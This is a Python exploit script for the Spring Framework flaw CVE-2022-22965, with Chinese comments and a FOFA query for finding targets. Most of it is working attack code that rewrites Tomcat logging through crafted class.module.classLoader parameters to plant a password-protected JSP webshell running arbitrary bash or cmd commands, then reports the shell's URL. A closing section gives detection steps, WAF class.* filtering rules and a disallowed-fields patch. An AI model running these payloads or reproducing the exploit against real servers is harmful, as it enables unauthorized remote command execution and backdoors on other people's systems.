import requests
requests.packages.urllib3.disable_warnings()
from time import sleep

'''
    使用JDK9及以上版本的Spring MVC框架
    spring-webmvc 或 spring-webflux依赖
    spring framework 5.3.0-5.3.17、5.2.0-5.2.19版本，以及更早的版本。

    fofa:
    app="APACHE-Tomcat" || app="vmware-SpringBoot-framework" || app="vmware-Spring-Batch" || app="vmware-Spring-framework" || app="vmware-Spring-Security"
    
    发送POST数据包如下：
    数据包格式Content-Type:application/x-www-form-urlencoded
    
    POST数据包
    class.module.classLoader.resources.context.parent.pipeline.first.pattern=spring-core-rce-test（写入shell内容）
    &class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp（修改tomcat配置日志文件后缀jsp）
    &class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT（写入shell在网站根目录）
    &class.module.classLoader.resources.context.parent.pipeline.first.prefix=myshell（写入shell文件名称）
    &class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

    
    class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("tomcat".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(new String[]{"bash","-c",request.getParameter("cmd")}).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i
    &class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
    &class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
    &class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
    &class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
'''


def poc(url, useragent, proxies=None):
    
    headers_1 = {
        "User-Agent": useragent,
        "prefix": "<%",
        "suffix": "%>//",
        "c": "Runtime",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
    }
    headers_2 = {
        "User-Agent": useragent,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_other = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    getpayload = url + payload_http
    try:
        requests.post(url, headers=headers_2, data=file_date_data, timeout=6, allow_redirects=False, verify=False, proxies=proxies) # 覆盖payload，放在历史webshell影响
        requests.post(url, headers=headers_2, data=payload_other, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        requests.post(url, headers=headers_1, data=payload_linux, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        requests.post(url, headers=headers_1, data=payload_win, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        requests.get(getpayload, headers=headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        test = requests.get(url + "/shell.jsp", timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        if (test.status_code == 200):
            return f'[+] CVE-2022-22965 exists, the Webshell link --> {url}/shell.jsp?pwd=tomcat&cmd=whoami'
        else:
            return '[-] CVE-2022-22965 not exists.'
    except Exception as e:
        return f'[-] An error occurred and it has been logged: {e}'
    

if __name__ == '__main__':

    print(poc(input('请输入目标url:').strip('/'), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'))


"""
SpringCore RCE漏洞影响排查方法：

(一)、JDK版本号排查

在业务系统的运行服务器上，执行“java -version”命令查看运行的JDK版本，如果版本号小于等于8，则不受漏洞影响

(二)、Spring框架使用情况排查

1、如果业务系统项目以war包形式部署，按照如下步骤进行判断。

⑴解压war包：将war文件的后缀修改成.zip ,解压zip文件

⑵在解压缩目录下搜索是否存在 spring-beans-*.jar 格式的jar文件（例如spring-beans-5.3.16.jar）,如存在则说明业务系统使用了spring框架进行开发。

⑶如果spring-beans-*.jar 文件不存在，则在解压缩目录下搜索CachedIntrospectionResuLts.class 文件是否存在，如存在则说明业务系统使用了Spring框架开发。

2、如果业务系统项目以jar包形式直接独立运行，按照如下步骤进行判断。

⑴解压jar包：将jar文件的后缀修改成.zip,解压zip文件。

⑵在解压缩目录下搜索是否存在spring-beans-*.jar 格式的jar文件（例如spring-beans-5.3.16.jar）,如存在则说明业务系统使用了spring框架进行开发。

⑶如果spring-beans-*.jar 文件不存在，则在解压缩目录下搜索CachedIntrospectionResuLts.class 文件是否存在，如存在则说明业务系统使用了spring框架进行开发。

(三)、综合判断

在完成以上两个步骤排查后，同时满足以下两个条件可确定受此漏洞影响：

⑴JDK版本号在9及以上的；

⑵使用了spring框架或衍生框架。

四、SpringCore RCE漏洞安全建议

目前，Spring官方已发布新版本完成漏洞修复，CNVD建议受漏洞影响的产品（服务）厂商和信息系统运营者尽快进行自查，并及时升级至最新版本：

https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement

也可以采用以下二个临时方案进行防护

(一）、WAF防护

在WAF等网络防护设备上，根据实际部署业务的流量情况，实现对“class.*”“Class.*”“*.class.*”“*.Class.*”等字符串的规则过滤，并在部暑过滤规则后，对业务运行情况进行测试，避免产生额外影响。

(二）、临时修复措施

需同时按以下两个步骤进行漏涧的临时修复:

1.在应用中全局搜索@InitBinder注解，看看方法体内是否调用dataBinder.setDisallowedFields方法，如果发现此代码片段的引入，则在原来的黑名单中，添加{"class.*","Class. *","*. class.*", "*.Class.*"}。(注:如果此代码片段使用较多,需要每个地方都追加)

2.在应用系统的项目包下新建以下全局类，并保证这个类被Spring 加载到(推荐在Controller 所在的包中添加).完成类添加后，需对项目进行重新编译打包和功能验证测试。并重新发布项目。

import org.springframework.core.annotation.Order;

import org.springframework.web.bind.WebDataBinder;

import org.springframework.web.bind.annotation.ControllerAdvice;

import org.springframework.web.bind.annotation.InitBinder;

@ControllerAdvice

@Order(10000)

public class a{

@InitBinder

public void setAllowedFields(WebDataBinder dataBinder) {

String[] abd = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};

dataBinder.setDisallowedFields(abd);

}

}
"""